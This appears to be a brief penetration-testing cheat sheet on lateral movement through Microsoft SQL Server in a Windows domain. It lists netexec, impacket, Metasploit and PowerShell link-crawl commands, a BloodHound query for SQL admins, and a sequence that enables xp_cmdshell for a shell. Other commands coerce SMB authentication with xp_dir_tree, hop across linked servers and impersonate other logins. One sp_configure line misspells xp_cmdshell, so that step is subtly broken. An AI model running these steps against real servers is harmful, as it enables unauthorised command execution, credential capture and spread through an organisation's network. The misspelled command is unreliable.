# MSSQL Lateral Movement

## Tools: CrackMapExec/Netexec , impacket-mssqlclient

 - netexec mssql IP -u USER -p PASSWORD -d DOMAIN (Find mssql access)

 - MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p (Users with SQL Admin bloodhound cypher query)

### Trust Link

#### 1) Metasploit

 - use exploit/windows/mssql/mssql_linkcrawler

#### 2) Powershell MSSQL Module

 - Get-SQLServerLinkCrawl -username USERNAME -password PASSWORD -Verbose -Instance SQL_INSTANCE -Query "SQL_QUERY"

#### 3) impacket-mssqlclient

 - impacket-mssqlclient -windows-auth DOMAIN/USER:PASSWORD@IP

### Commands upon login:

 - enum_db

 - enable xp_cmdshell --> xp_cmdshell COMMAND (Gives low access shell)

 - xp_dir_tree IP (Coerce SMB)

 - trustlink --> sp_linkedservers --> use_link (MSSQL Lateral Movement)

 - enum_impersonate --> exec_as_user USER

 - enum_impersonate --> exec_as_login LOGIN

#### 4) MSSQL Client shell

 - EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;

 - EXECUTE sp_configure 'xp_cmdhsell',1; RECONFIGURE;

 - EXEC xp_cmdshell 'COMMAND' (Gains low access shell)
